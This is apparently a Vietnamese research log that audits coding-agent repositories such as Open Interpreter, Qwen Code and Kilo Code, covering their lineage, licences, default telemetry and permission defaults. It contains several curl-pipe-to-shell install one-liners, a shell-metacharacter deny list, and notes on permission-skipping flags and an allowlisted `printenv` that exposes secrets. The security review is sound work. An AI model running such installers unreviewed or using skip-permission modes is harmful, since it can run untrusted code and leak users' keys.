> Hai việc. (1) Đọc lại sao, license, trạng thái của các repo mục 01 bằng GitHub search API (31/10/2026). (2) Tìm repo lớn còn thiếu: 6 truy vấn (`coding agent`, topic `coding-agent`, `terminal agent`, `ai coding assistant cli`, `claude code alternative`, repo tạo sau 1/10/2025), lọc bỏ repo đã có trong `data/projects.json`. Chọn **7 repo**, clone `--filter=blob:none` (lịch sử) và `--depth 1` (đọc/grep mã): LICENSE, manifest, cấu trúc gốc, file nguồn chính, workflow CI, grep telemetry/host mạng; đếm commit, tác giả, trailer `Co-Authored-By: Claude`. **Không cài, không chạy script nào của repo.**

### 3i.1 Repo cũ: điều đã đổi

| Repo | Thay đổi (README cũ → 31/10/2026) | Hệ quả |
|---|---|---|
| `sst/opencode` | **Đổi chủ thành `anomalyco/opencode`**; ~210k → 223,6k★ | Bảng 1.1 và catalog nên dùng URL mới (URL cũ chuyển hướng) |
| `RooCodeInc/Roo-Code` | **Đã archive**, push cuối 15/5/2026; 24,3k★ | Không chọn cho dự án mới. Kilo Code (`Kilo-Org/kilocode`, 27,8k★, MIT) thay thế được về sản phẩm, nhưng mã 7.x là fork **OpenCode**; nhánh Cline/Roo cũ nằm ở `Kilo-Org/kilocode-legacy` (đã archive) — §3j |
| `block/goose` | Search API trả về **`aaif-goose/goose`** 56k★, Apache-2.0, push 31/10 | Dự án đã chuyển tổ chức; cập nhật URL **(chưa mở được trang chuyển hướng để xác minh)** |
| `deepseek-ai/deepseek-harness` | ~200k → **267,4k★** | Vẫn lớn nhất bảng 1.1 |
| `stablyai/orca` | "chưa rõ (10k–43k)" → **111,7k★** | Hết "chưa xác minh" về số sao; số mới gấp ~2,6 lần mức cao nhất từng ghi |
| `anthropics/claude-code` | ~148k → 154,1k★ | Vẫn mã đóng (GitHub không nhận license) |
| `pingdotgg/t3code` | 27,1k → 35,4k★ | |
| `storytold/filmcraft` / `craft-launcher` | 10,9k → 17,1k★ / 1,56k → 4,4k★ | §3d, §3e; GitHub chỉ hiện `Apache-2.0` vì repo dual `MIT OR Apache-2.0` |
| `Aider-AI/aider` | Push cuối **22/5/2026** | Đã đứng hơn 5 tháng, đúng nhận định "phát triển chậm lại" |
| `smtg-ai/claude-squad` | Push cuối 20/8/2026 | Chậm lại; ADE khác trong §1.3 vẫn push hằng ngày |
| `OpenAI Codex`, `Gemini CLI`, `OpenHands`, `Cline` | 127k → 132,5k · 107k → 108,7k · 90k → 92,4k · 69k → 71,1k | Dao động bình thường |

### 3i.2 Bảng nhanh 7 repo mới

| Repo | Nhóm | ★ · license | Commit cuối | Một dòng | Cờ |
|---|---|---|---|---|---|
| `ultraworkers/claw-code` | CLI agent (Rust) | 195k · MIT | 29/10/2026 | CLI `claw` viết lại bằng Rust, tự nhận là "hiện vật bảo tàng" do agent bảo trì | **Gắn với vụ lộ mã Claude Code**, README khuyên dùng repo khác |
| `openinterpreter/openinterpreter` | CLI agent | 68,8k · Apache-2.0 | 31/10/2026 | **Nay là fork của OpenAI Codex**, có `/harness` giả lập 14 harness khác cho model rẻ | **Metrics gửi Statsig của OpenAI bật sẵn**; nhúng system prompt Claude Code |
| `warpdotdev/warp` | ADE / terminal | 65,8k · AGPL-3.0 + MIT | 30/10/2026 | Client Warp mở mã (4/2026), có agent riêng và chạy được Claude Code/Codex | Server, Drive, Oz vẫn đóng; telemetry bật sẵn |
| `codewhale-hq/Codewhale` | CLI agent (Rust) | 41,2k · MIT | 31/10/2026 | Tên mới của DeepSeek-TUI: 40+ provider, `/receipts` liệt kê mọi thay đổi | Telemetry bật sẵn; link giới thiệu có hoa hồng |
| `can1357/oh-my-pi` | CLI agent | 37,3k · MIT | 31/10/2026 | Fork của Pi (Mario Zechner): LSP, DAP, 60+ provider, lõi Rust | Lịch sử 35k commit, Auto QA ghi cục bộ bật sẵn |
| `QwenLM/qwen-code` | CLI agent | 28,9k · Apache-2.0 | 31/10/2026 | Agent terminal của Alibaba Qwen (gốc Gemini CLI 0.8.2), IDE, desktop, SDK | **Usage stats bật sẵn gửi Aliyun RUM** |
| `xai-org/grok-build` | CLI agent (Rust) | 27,6k · Apache-2.0 | 29/9/2026 | Mã nguồn CLI/TUI `grok` của SpaceXAI, đồng bộ từ monorepo | Không nhận PR; 51 commit đều do bot |

### 3i.3 Hồ sơ từng repo

- **Open Interpreter đổi hẳn bản chất.** Repo 68,8k★ (sao từ thời bản Python 2023) nay là **fork của `openai/codex`**: commit đầu 16/4/2025 của Ilan Bigio (OpenAI), `NOTICE` ghi "OpenAI Codex, Copyright 2025 OpenAI", `FORK_BRANDING.md` giải thích chỉ đổi lớp nhận diện, giữ tên crate `codex-*`. 10.770 commit, 628 tác giả (đa số là commit upstream Codex), bản hiện tại v0.0.57 (31/10). Điểm riêng là `codex-rs/core/src/harness/` với 14 bộ giả lập harness (claude-code, kimi-code, qwen-code, opencode, swe-agent, mini-swe-agent, terminus-2, pi…), chọn bằng `/harness`. ✅ README "Codex-compatible" khớp mã (giữ nguyên exec protocol). ⚠️ **`claude_code_prompt.rs` chép gần như nguyên văn system prompt của Claude Code** (mã đóng, không có license cho phép), cùng kiểu rủi ro sở hữu trí tuệ đã ghi ở mục 06 §7p (baoyu-design). ❌ Về mạng: `OtelConfig::default()` đặt `metrics_exporter = Statsig`, endpoint `https://ab.chatgpt.com/otlp/v1/metrics` kèm khoá client Statsig của OpenAI; TUI gọi với `default_analytics_enabled = true`, chỉ bản debug mới tắt. Nghĩa là bản phát hành gửi metrics về hạ tầng của OpenAI dù đây không phải sản phẩm OpenAI **(đọc mã, chưa chạy để bắt gói)**. Tắt bằng `analytics.enabled = false` trong config. Cài: `curl -fsSL https://www.openinterpreter.com/install | sh` (nên tải script về đọc trước).
- **Warp mở mã client.** Lịch sử công khai bắt đầu 28/4/2026 (tag `repo-sync/watermark/private-to-public`), 2.605 commit, 186 tác giả; người commit nhiều nhất là bot `warp-agent-staging[bot]` (438). License **hai lớp**: crate UI `warpui_core`, `warpui` theo MIT, phần còn lại AGPL-3.0; `FAQ.md` nói rõ server, backend Warp Drive và Oz (lớp điều phối agent) **vẫn đóng**. README ghi OpenAI là "nhà tài trợ sáng lập" của repo mở. Có 80 crate, 293 spec trong `specs/`, 21 workflow. Telemetry RudderStack (`privacy.telemetry_enabled`, mặc định `true`) và crash report Sentry (mặc định `true`), tắt được trong cài đặt. Hệ quả AGPL: nhúng hay dựng dịch vụ từ client phải mở mã phần sửa. Cài: tải từ warp.dev/download; build nguồn theo `./script/presubmit`.
- **Codewhale** là tên mới của DeepSeek-TUI (`LICENSE` vẫn ghi "DeepSeek-TUI Contributors", `codewhale doctor` nhận cả binary `deepseek-tui`). 13.853 commit từ 19/1/2026, 310 tác giả, **18,9% commit có trailer Claude**, bot `CodeWhale Bot` đứng đầu. Có `docs/TELEMETRY.md` rõ ràng: usage analytics **bật sẵn** gửi `telemetry.codewhale.net`, tắt bằng `codewhale config set telemetry false` hoặc `DO_NOT_TRACK=1`; có thư mục `telemetry-ingest/` (mã máy chủ nhận) để đối chiếu. ✅ `/receipts` (danh sách file đổi, lệnh chạy, gọi web/MCP) là điểm đáng học. README đặt banner OrcaRouter và ghi rõ "Codewhale earns a referral fee". Cài: `npm install -g codewhale` hoặc `cargo install codewhale-cli --locked`.
- **oh-my-pi (`omp`)** là fork của Pi (`badlogic/pi-mono`), `LICENSE` MIT ghi ba chủ bản quyền (Mario Zechner, Can Bölük, Stencil Labs). 35.224 commit (gồm lịch sử Pi), tác giả chính can1357 (12.799) và bot `roboomp`. ⚠️ README ghi "~80k dòng Rust core"; đếm thô `crates/` (bỏ `vendor/`) ra ~431k dòng `.rs`, chênh do cách đếm. Mạng: `auth.stencil.so`, `api.stencil.so`; tính năng "Auto QA" (`dev.autoqa`) **bật sẵn** ghi lỗi "grievance" vào DB cục bộ, chỉ đẩy lên `qa.omp.sh` khi người dùng đồng ý (`dev.autoqaConsent` mặc định `unset`). PR vừa mở cho mọi người "thử nghiệm". Cài: `brew install can1357/tap/omp` hoặc `curl -fsSL https://omp.sh/install | sh` (có kiểm SHA-256 cho binary).
- **Qwen Code** (Alibaba). Gốc Gemini CLI v0.8.2, tách hẳn từ v0.1 (README ghi). 11.791 commit, 666 tác giả, v0.26.4; 22 package (CLI, desktop, web-shell, SDK Python/TS/Java, extension VS Code/Zed, kênh chat). **11,6% commit có trailer Claude** dù README nói Qwen Code "tự phát triển bằng agent và model của chính nó". ❌ `privacy.usageStatisticsEnabled` mặc định `true`, `qwen-logger.ts` gửi sự kiện tới `gb4w8c3ygj-default-sea.rum.aliyuncs.com`; README không nhắc. Tắt bằng `"privacy": {"usageStatisticsEnabled": false}` trong settings. Cài: `npm install -g @qwen-code/qwen-code` (Node ≥ 22); script cài một dòng trỏ tới OSS Hàng Châu.
- **Grok Build** (SpaceXAI/xAI). Repo chỉ là **bản đồng bộ một chiều** từ monorepo (`SOURCE_REV`), 51 commit đều của `grokkybara[bot]` từ 16/7/2026, `CONTRIBUTING.md` từ chối mọi PR ngoài. ~2 triệu dòng Rust trong 105 crate. Mạng mặc định: `api.x.ai`, `auth.x.ai`, `cli-chat-proxy.grok.com`. Có crate Mixpanel, Sentry, OTel và upload metadata từng lượt (`PromptMetadata`, schema v1.24 ghi "prompt content is no longer uploaded"). `TelemetryMode` mặc định trong code là `Disabled` ("enterprise default"), nhưng giá trị thật lấy từ cấu hình đám mây **(chưa xác minh hành vi bản phát hành)**. Đứng yên từ 29/9/2026. Cài: `curl -fsSL https://x.ai/cli/install.sh | bash`.
- **claw-code** tạo 31/3/2026 và lên 195k★, cao thứ ba trong mục. README nay tự nhận là **"museum exhibit"** do agent bảo trì, khuyên người muốn làm việc thật chuyển sang LazyCodex (`code-yeongyu`; người commit nhiều nhất claw-code là YeonGyu-Kim, 564/1.858 commit) hoặc Gajae-Code (của tác giả oh-my-claudecode, mục 03 §8g). Phần chạy được là workspace Rust `rust/` (~131k dòng, CLI `claw`, cần `ANTHROPIC_API_KEY`); `src/` là "reference workspace" Python với tên module trùng cấu trúc Claude Code (`QueryEngine.py`, `Tool.py`, `buddy/`…). README có mục "không nhận quyền sở hữu mã nguồn Claude Code gốc". Ngày tạo trùng ngày mã Claude Code bị lộ qua source map npm **(theo tin tức, chưa xác minh trong repo)**. ⚠️ `cargo install claw-code` cài nhầm một stub đã đổi tên. Kho chỉ ghi nhận để tránh, không khuyên dùng.

### 3i.4 Mẫu chung rút ra

1. **Fork là cách ra sản phẩm phổ biến nhất**: Open Interpreter (fork Codex), Qwen Code (Gemini CLI), oh-my-pi (Pi), Codewhale (đổi tên DeepSeek-TUI). Sao của repo không nói gì về mã bên trong: 68,8k★ của Open Interpreter là của một sản phẩm Python đã bị thay toàn bộ.
2. **Telemetry bật sẵn là mặc định của nhóm CLI agent**: Qwen Code, Warp, Codewhale, Open Interpreter (về cả máy chủ của bên thứ ba). Chỉ Codewhale và (một phần) oh-my-pi có tài liệu đủ và hỏi đồng ý. `DO_NOT_TRACK=1` không phủ hết: Qwen Code và Open Interpreter cần khoá config riêng.
3. **"Mở mã" không có nghĩa là nhận đóng góp**: Grok Build từ chối PR, Warp giữ server đóng, oh-my-pi mới mở PR thử nghiệm.
4. **Rủi ro sở hữu trí tuệ quanh Claude Code** lặp lại (claw-code, prompt nhúng trong Open Interpreter): khi tích hợp, grep chuỗi system prompt của bên thứ ba trước khi phân phối lại.
5. **Biên lai hành động** (`/receipts` của Codewhale) là mẫu nên chép cho mọi agent chạy lâu: liệt kê file, lệnh, lời gọi mạng của phiên.

**Nguồn §3i:** GitHub search API 31/10/2026 (6 truy vấn + `repo:` cho `anomalyco/opencode`, `RooCodeInc/Roo-Code`, `Kilo-Org/kilocode`, `aaif-goose/goose`) · `meta_all.json`/`status_all.json` (GitHub API 31/10/2026) · clone `--filter=blob:none` và `--depth 1` 7 repo, đọc: openinterpreter (README.md, FORK_BRANDING.md, NOTICE, `codex-rs/core/src/harness/*`, `codex-rs/otel/src/config.rs`, `codex-rs/config/src/types.rs`, `codex-rs/core/src/otel_init.rs`, `codex-rs/tui/src/startup_orchestration.rs`) · warp (README.md, FAQ.md, LICENSE-AGPL, LICENSE-MIT, `app/src/settings/privacy.rs`, `app/src/server/telemetry/*`, `.claude/settings.json`, `specs/`) · Codewhale (README.md, LICENSE, CHANGELOG.md, docs/TELEMETRY.md, `telemetry-ingest/`) · oh-my-pi (README.md, LICENSE, `packages/coding-agent/src/tools/settings.ts`, `cli/grievances-cli.ts`) · qwen-code (README.md, package.json, `packages/core/src/telemetry/qwen-logger/qwen-logger.ts`, `packages/cli/src/config/settingsSchema.ts`) · grok-build (README.md, CONTRIBUTING.md, SOURCE_REV, LICENSE, `crates/codegen/xai-grok-telemetry/src/{config,client}.rs`, `prod/mc/cli-chat-proxy-types/src/metadata_types.rs`) · claw-code (README.md, LICENSE, PHILOSOPHY.md, concept.md, `rust/`, `src/`, `.github/workflows/`) · https://github.com/anomalyco/opencode · https://github.com/Kilo-Org/kilocode · https://github.com/aaif-goose/goose

## 3j. Đọc mã kỹ: Kilo-Org/kilocode (yêu cầu người dùng, 1/11/2026)

> §3i ghi `Kilo-Org/kilocode` là "nhánh còn sống" của Roo Code. Đợt này clone `--filter=blob:none` (HEAD `dd35e09`, 31/10/2026), đọc mã CLI, extension VS Code, plugin JetBrains, gói telemetry, gateway, marketplace, CI. **Không cài, không chạy script.** Số sao từ GitHub search API 1/11/2026.

### 3j.1 Danh tính và dòng dõi: Kilo hôm nay là fork của OpenCode, không còn là fork Roo Code

| Mục | Thông tin (HEAD `dd35e09`, 31/10/2026) |
|---|---|
| Repo | **27.818★**, 3.319 fork, 828 issue mở · tạo 10/3/2025 · push 31/10/2026 · GitHub nhận MIT |
| Lịch sử `main` | 33.984 commit; commit gốc là **"initial" của Kujtim Hoxha, 21/3/2025** (lịch sử OpenCode), không phải lịch sử Roo/Cline. 1.278 tên tác giả |
| Ai viết | Nhân sự Kilo (`marius-kilocode` 2.506 + `Marius` 1.830, `kirillk` 2.144, Mark IJbema 1.718, Catriel Müller 1.007…) đan xen tác giả upstream OpenCode (Dax Raad 1.973, Adam 1.442, `opencode-agent[bot]` 1.392, Kit Langton 1.085, Aiden Cline ~1.450, Frank `@anoma.ly` 468). Bot Kilo: `kiloconnect[bot]` 740, `kilo-maintainer[bot]` 661 |
| Trailer AI | 83 dòng `Co-Authored-By: Claude` (~0,2% commit); 587 dòng trailer Cursor/Copilot/Codex/Kilo |
| Phát hành | 292 tag; `v7.8.25` ngày 28/10/2026, 5 bản trong ngày 28/10; JetBrains có tag riêng (`jetbrains/v7.2.1-rc.1`). Tag không ký **(chưa xác minh chữ ký release asset)** |
| LICENSE | MIT, hai chủ bản quyền: "2026 Kilo Code" và **"2025 opencode"**. Không có NOTICE. Repo cũ thời Roo (`Kilo-Org/kilocode-legacy`) là **Apache-2.0** |

**Dòng dõi thật (đối chiếu mã + CHANGELOG):**

1. **Cline → Roo Code → Kilo Code 4.x/5.x**: đúng cho giai đoạn 2025. `packages/kilo-vscode/CHANGELOG.md` còn các mục "Include changes from Roo Code v3.28…v3.41.2" và cherry-pick PR Roo (dòng ~4056–5527). Mã đó nay nằm ở **`Kilo-Org/kilocode-legacy`** (44★, Apache-2.0, **đã archive**, push cuối 3/8/2026); mục 5.12.0 trong CHANGELOG trỏ PR về repo legacy.
2. **Kilo CLI = fork OpenCode**: repo `Kilo-Org/kilo` (203★, MIT, đã archive 24/2/2026) được gộp vào; commit "Merge OpenCode v1.1.42 (#67)" 2/2/2026, "merge opencode v1.1.46" 4/2/2026. `AGENTS.md`: "Kilo CLI `packages/opencode/` … Fork of upstream OpenCode".
3. **Extension 7.x viết lại trên server OpenCode**: CHANGELOG nhảy từ 5.12.0 sang 7.0.x; mọi client (VS Code, JetBrains, Cloud) chỉ là vỏ gọi `kilo serve` qua HTTP + SSE (`AGENTS.md` mục Products). Blog Kilo ghi ngày ra mắt bản rebuild là 2/4/2026 **(theo nguồn của Kilo)**. Vẫn theo upstream sát: workflow `watch-opencode-releases.yml`, merge `upstream/main` ngày 27/10/2026, mọi sửa trong file chung phải đánh dấu `kilocode_change` (CI `check-opencode-annotations.yml`).
4. **Roo Code ngừng**: Roo archive 15/5/2026 (24.254★); Kilo giữ nút "Import Sessions from Roo Code" (PR #11303) và trang hướng dẫn chuyển từ Roo.

→ Hệ quả cho kho: bảng 1.1 (dòng "Roo Code / Kilo Code … Fork Cline") và §3i đã lỗi thời. Kilo hiện là **anh em của OpenCode (`anomalyco/opencode`, 223,6k★)**, chỉ còn chung với Roo ở tên mode, file `.roomodes`/`.kilocodeignore` (có `modes-migrator.ts`, `rules-migrator.ts`, `ignore-migrator.ts` trong `packages/opencode/src/kilocode/`).

### 3j.2 Kiến trúc và phần Kilo thêm vào OpenCode

- Monorepo Bun 1.4 + Turbo, 35 gói trong `packages/`: lõi `opencode` (CLI/TUI/server, Effect 4 beta, SQLite qua Drizzle), `kilo-vscode` (extension, có Agent Manager chạy nhiều phiên trên git worktree), `kilo-jetbrains` (Kotlin, cần Java 21), `kilo-gateway`, `kilo-telemetry`, `kilo-indexing`, `kilo-memory`, `kilo-sandbox`, `kilo-docs`… **(chưa đếm LOC)**.
- Phần riêng của Kilo gom trong `packages/opencode/src/kilocode/` (agent-manager, board, cloud, session-hosting, auto-routing, indexing, marketplace, sandbox, daemon, migrator từ Roo/Kilo cũ, tích hợp Anaconda Desktop).
- **Kilo Gateway**: provider `kilo` trỏ `https://ai-gateway.kilo.ai/api/v1` và API `https://api.kilo.ai` (`kilo-gateway/src/api/constants.ts:10,19`); có router `kilo-auto/*`, trang số dư `app.kilo.ai/usage`, tự làm mới số dư (`balance-refresh.ts`). README nói "provider pricing, zero markup", không kiểm được từ mã **(chưa xác minh)**.
- Sản phẩm đám mây đóng hoặc ở repo khác: Cloud Agent (`app.kilo.ai/cloud`), Code Reviews, `Kilo-Org/cloud` (21★, license NOASSERTION).

### 3j.3 Phát hiện an ninh, quyền và mạng (đọc mã)

- ❌ **Mặc định không có key thì prompt đi qua máy chủ Kilo**: thiếu key thì gateway dùng `apiKey: "anonymous"` và model mặc định `kilo-auto/free` (`constants.ts:72-90`, `loader.ts:21,34`). README "No API keys required to start" đúng, nhưng nghĩa là mã nguồn và prompt gửi tới `ai-gateway.kilo.ai` rồi tới model miễn phí do Kilo chọn. Danh mục marketplace cũng lấy từ `https://api.kilo.ai/api/marketplace` (`marketplace/api.ts:12`, đổi được bằng `KILO_MARKETPLACE_BASE_URL`).
- ❌ **Telemetry PostHog bật sẵn, khoá ghi cứng**: `kilo-telemetry/src/client.ts:8-9` (`phc_GK2P…`, `https://us.i.posthog.com`). Sự kiện là metadata (CLI start/exit, session, LLM completion, tool/agent/command dùng, MCP server connect/error, indexing, auth), **không thấy nội dung prompt** trong `events.ts`. Nhưng khi đăng nhập, `machineId` bị `alias` sang **email tài khoản Kilo** (`telemetry.ts:160-163`, email lấy từ profile và cache ở `identity.ts`). Nếu máy có `~/.conda/aau_token`, CLI chạy `conda info --json` để lấy client token ẩn danh của Anaconda làm khoá nối (`conda.ts:9-41`, gắn vào thuộc tính `aauClientToken`).
- ⚠️ **Công tắc tắt khác nhau theo client, và docs chỉ nói một cách**: docs (`kilo-docs/pages/getting-started/settings/index.md:301`) ghi "Telemetry is enabled by default", tắt bằng `experimental.openTelemetry: false` trong `kilo.jsonc`. Mã: biến `KILO_TELEMETRY_LEVEL` **thắng cấu hình** (`telemetry.ts:125-127`).
  - CLI đơn: tắt bằng `experimental.openTelemetry: false` hoặc `KILO_TELEMETRY_LEVEL=off`. **Không có mã nguồn nào của Kilo đọc `DO_NOT_TRACK`** (grep chỉ thấy một test đặt `DO_NOT_TRACK: "1"` trong `packages/opencode/test/kilocode/startup-speed.test.ts`).
  - VS Code: extension đặt `KILO_TELEMETRY_LEVEL` theo `vscode.env.isTelemetryEnabled` (`server-manager.ts:157`) và đồng bộ khi đổi (`telemetry-proxy.ts:71-83`). Muốn tắt phải tắt telemetry của **cả VS Code** (`telemetry.telemetryLevel: off`); tắt trong `kilo.jsonc` bị env ghi đè.
  - ❌ **JetBrains: luôn `"all"`** trừ chế độ dev (`KiloBackendCliManager.kt:615`, ghi đè cả env người dùng vì `put` sau `putAll(base)`), và gọi `setTelemetry(true)` sau khi kết nối (`KiloBackendAppService.kt:470`). Không tìm thấy công tắc hay kiểm cài đặt IDE nào **(đọc mã, chưa chạy để bắt gói)**.
  - `PRIVACY.md` (cập nhật 7/3/2025) không nhắc PostHog hay telemetry.
- ⚠️ **Quyền mặc định thoáng ở mode Code**: lớp mặc định `"*": "allow"` (`opencode/src/agent/agent.ts:136-158`), tức **sửa/ghi file, `webfetch` và tool MCP không hỏi** ở CLI và VS Code; chỉ JetBrains đặt `edit: "ask"` (`kilocode/agent/index.ts:389`). Bash `"*": "ask"` nhưng cho sẵn một allowlist gồm `cp`, `mv`, `tar`, `unzip`, `tsc` và **`printenv *`** (`kilocode/agent/index.ts:25-68`), nên model đọc được biến môi trường (thường chứa key) mà không hỏi. Luật `"<mcp>_*": "ask"` từ `getMcpRules` chỉ áp cho mode Plan/Ask (`index.ts:532,643`), mode Code không có. `.env` đọc phải hỏi; thư mục ngoài dự án phải hỏi. Mode Ask/Plan dùng `readOnlyBash` (deny `|`, `;`, `&`, `>`, `$(`…); chú thích trong mã tự nhận "defense-in-depth, not a sandbox".
- ⚠️ **YOLO**: `kilo run --auto` tự duyệt mọi thứ trừ luật deny; còn `--yolo` / `--dangerously-skip-permissions` (`cli/cmd/run.ts:256-298`). README chỉ cảnh báo `--auto` "trusted environments".
- ✅ **Sandbox có nhưng tắt sẵn**: `sandbox.enabled` mặc định `false`, mạng trong sandbox mặc định deny khi bật (`kilocode/sandbox/config.ts:21-43`), dựa trên `@anthropic-ai/sandbox-runtime` 0.0.63. Bật bằng `/sandbox` hoặc config.
- ⚠️ **Marketplace MCP không có kiểm toàn vẹn**: mục MCP từ catalog được chép thẳng thành `{type: "local", command: [...]}` hoặc `remote` vào config (`marketplace/mcp-entry.ts:23-35`); không có hash/chữ ký; skill tải dạng tarball. Kết hợp với "tool MCP không hỏi" ở mode Code, một mục marketplace độc chạy được ngay.
- ⚠️ **API key lưu plaintext JSON**: `~/.local/share/kilo/auth.json`, quyền `0o600` (`opencode/src/auth/index.ts:11,81`). Extension VS Code **không dùng `SecretStorage`** (grep `context.secrets` không có); key nằm trong file của CLI.
- ✅ Server cục bộ: VS Code và JetBrains sinh `kilo serve --port 0` với `KILO_SERVER_PASSWORD` ngẫu nhiên (Basic auth); `kilo serve` chạy tay mà thiếu mật khẩu chỉ in cảnh báo "server is unsecured" (`cli/cmd/serve.ts:15-16`). Biến này bị xoá khỏi env của tiến trình con (`kilocode/process/env.ts:7`).
- ⚠️ Cài đặt: `curl -fsSL https://kilo.ai/cli/install | bash`; script `install` tải binary từ GitHub Releases **không kiểm checksum** (`install:196-207`). CLI tự cập nhật trừ khi `KILO_DISABLE_AUTOUPDATE=1`. Kilo cũng đọc skill và `CLAUDE.md` của Claude Code mặc định (tắt bằng `KILO_DISABLE_CLAUDE_CODE=1`).

### 3j.4 Cổng chất lượng

- 39 workflow: `test.yml` (unit đa OS, chia shard, HttpApi exerciser, JetBrains), `typecheck.yml`, `test-vscode.yml`, `test-jetbrains.yml`, `visual-regression.yml`, `smoke-test.yml`, `codeql.yml` + `codeql-kotlin.yml`, `check-forbidden-strings.yml`, `check-opencode-annotations.yml` (kèm allowlist workflow để workflow upstream không tự chạy), `nix-hashes.yml`. Có `dependabot-auto-merge.yml`. Số file test chưa đếm **(chưa xác minh)**; gói telemetry có test cho việc tắt (`identity-delivery.test.ts:67-68`), test JetBrains khẳng định `KILO_TELEMETRY_LEVEL == "all"` (`KiloBackendCliManagerEnvTest.kt:42`), tức hành vi "luôn bật" là chủ đích.
- `AGENTS.md` dặn agent "execute requested actions without confirmation", "never run root `bun test`"; repo có `.claude`-style skill nội bộ cho JetBrains.

### 3j.5 README nói gì, mã làm gì

| Tuyên bố | Kết quả | Bằng chứng |
|---|---|---|
| "Open source coding agent", MIT | ✅ | LICENSE MIT (kèm bản quyền opencode); cloud/gateway là dịch vụ riêng |
| VS Code, JetBrains, CLI cùng một lõi | ✅ | Mọi client gọi `kilo serve` (`AGENTS.md`, `server-manager.ts`, `KiloBackendCliManager.kt`) |
| "No API keys required to start" | ⚠️ | Đúng, vì mặc định đi qua `ai-gateway.kilo.ai` với khoá `anonymous` |
| "Pay the model provider's rate with zero markup" | ⚠️ | Không kiểm được từ mã client **(chưa xác minh)** |
| `--auto` "only in trusted environments" | ✅/⚠️ | Đúng, nhưng còn `--yolo`/`--dangerously-skip-permissions` không nêu trong README; mode Code mặc định đã cho sửa file không hỏi |
| PRIVACY: dữ liệu chỉ tới nhà cung cấp model đã chọn | ❌ | Không nói PostHog, alias email, token Anaconda; mặc định gateway là của Kilo |
| Docs: tắt telemetry bằng `experimental.openTelemetry: false` | ⚠️ | Đúng với CLI đơn; bị env ghi đè trong VS Code; JetBrains không tắt được |
| "Kilo Marketplace" cài agent/skill/MCP | ✅/⚠️ | Có, catalog từ `api.kilo.ai`, không kiểm toàn vẹn |

### 3j.6 Rủi ro và cách dùng

**Rủi ro:** (1) đổi nền từ Roo sang OpenCode, nên đánh giá cũ về Roo không áp dụng; cấu hình, đường dẫn dữ liệu và hành vi khác hẳn; (2) phụ thuộc dịch vụ Kilo theo mặc định (gateway, marketplace, profile, model miễn phí); (3) telemetry gắn email, JetBrains không tắt được; (4) mode Code sửa file, chạy tool MCP và `printenv` không hỏi; (5) key plaintext; (6) nhịp phát hành rất nhanh (5 bản/ngày) với lõi Effect 4 beta, merge upstream liên tục; (7) một lượng lớn commit do bot.

**Khuyến nghị:** dùng được cho cá nhân thay Roo Code, nhưng coi như OpenCode có thêm lớp dịch vụ Kilo. Cấu hình tối thiểu:

- Cài: `npm install -g @kilocode/cli` (thay vì `curl | bash`), hoặc extension `kilocode.Kilo-Code` từ Marketplace.
- Chọn provider của mình (BYOK hoặc model cục bộ) trước prompt đầu tiên để không đi qua `kilo-auto/free`.
- Tắt telemetry: `kilo.jsonc` → `"experimental": {"openTelemetry": false}` **và** `export KILO_TELEMETRY_LEVEL=off`; trong VS Code tắt `telemetry.telemetryLevel`. Với JetBrains, chặn `us.i.posthog.com` ở firewall hoặc không dùng.
- Siết quyền: `"permission": {"edit": "ask", "webfetch": "ask", "bash": {"printenv *": "deny"}}` và thêm `"<tên-mcp>_*": "ask"` cho từng MCP; bật `"sandbox": {"enabled": true}` trên macOS/Linux.
- Không dùng `--auto`/`--yolo` ngoài container CI dùng một lần; không cài mục marketplace chưa đọc lệnh.

**Nguồn §3j:** clone `Kilo-Org/kilocode` (`--filter=blob:none`, HEAD `dd35e09`, 31/10/2026), đọc: README.md, LICENSE, PRIVACY.md, AGENTS.md, CONTEXT.md, package.json, `install`, `.github/workflows/` (39 file, `test.yml`), `packages/kilo-vscode/CHANGELOG.md`, `packages/kilo-vscode/README.md`, `packages/kilo-telemetry/src/{client,telemetry,events,identity,conda}.ts`, `packages/kilo-vscode/src/services/telemetry/telemetry-proxy.ts`, `packages/kilo-vscode/src/services/cli-backend/server-manager.ts`, `packages/kilo-vscode/src/services/marketplace/actions.ts`, `packages/kilo-jetbrains/backend/.../cli/KiloBackendCliManager.kt`, `.../telemetry/KiloBackendTelemetry.kt`, `.../app/KiloBackendAppService.kt`, `packages/opencode/src/kilocode/cli/setup.ts`, `packages/opencode/src/agent/agent.ts`, `packages/opencode/src/kilocode/agent/index.ts`, `packages/opencode/src/cli/cmd/{run,serve}.ts`, `packages/opencode/src/auth/index.ts`, `packages/opencode/src/kilocode/marketplace/{api,mcp-entry}.ts`, `packages/opencode/src/kilocode/sandbox/config.ts`, `packages/kilo-gateway/src/{loader.ts,api/constants.ts}`, `packages/kilo-docs/pages/getting-started/settings/index.md` · GitHub search API 1/11/2026 (`Kilo-Org/kilocode`, `Kilo-Org/kilocode-legacy`, `Kilo-Org/kilo`, `Kilo-Org/cloud`, `RooCodeInc/Roo-Code`, `cline/cline`, `anomalyco/opencode`) · https://blog.kilo.ai/thank-you-roo · https://kilo.ai/landing/roo-code · https://www.producthunt.com/p/kilocode/kilo-code-v7-for-vs-code · https://www.morphllm.com/comparisons/kilo-code-vs-opencode (blog bên thứ ba)

## 3k. Nâng trần 2/11/2026: benchmark coding agent chạy được tại chỗ, có cổng oracle/nop (yêu cầu người dùng)

> Đọc lại §1–§3j và catalog; grep `repo` trong `data/projects.json` trước khi thêm. Sao/license/ngày lấy bằng GitHub search API 2/11/2026; clone `--depth 1 --filter=blob:none`, chỉ đọc (LICENSE, README, CHANGELOG, harness chính). **Không cài, không chạy.**

**Trần hiện tại**

- §2 chỉ ghi *kết quả* leaderboard (SWE-bench Verified bão hòa, SWE-bench Pro ~65%), không có repo harness nào để dự án **tự chạy** benchmark trên agent/harness của mình.
- Bảng 1.1 có `mini-SWE-agent` (harness chuẩn của Vals) và mục 07 có Harbor/Terminal-Bench, nhưng thiếu lớp **dữ liệu + bộ chấm** (FAIL_TO_PASS/PASS_TO_PASS, ảnh Docker cố định) và lớp **chống nhiễm dữ liệu** (task mới hằng tháng).
- Chọn coding agent hiện dựa vào tiêu chí định tính (§2 "Bài học"); chưa có cổng máy để so hai cấu hình harness trên cùng tập task.

**Bảng repo mới**

| Repo | Lớp | ★ · license (2/11/2026) | Commit cuối | Vì sao nâng trần | Rủi ro |
|---|---|---|---|---|---|
